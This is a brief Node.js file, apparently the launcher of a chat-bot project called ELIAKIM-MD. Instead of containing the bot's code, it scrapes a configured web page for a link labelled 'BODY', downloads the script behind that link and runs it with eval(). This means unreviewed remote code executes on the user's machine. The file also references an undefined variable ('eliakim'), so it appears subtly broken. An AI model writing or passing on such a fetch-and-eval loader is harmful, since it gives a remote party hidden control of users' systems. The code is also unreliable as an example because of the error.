//  [ELIAKIM-MD]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Eliakim                                   

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require("./config");

async function fetchBODYUrl() {
  try {
    const response = await axios.get(eliakim.ELIAKIM_MD);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("BODY")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('heart not found 😭');
    }

    console.log('The heart is loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchBODYUrl();
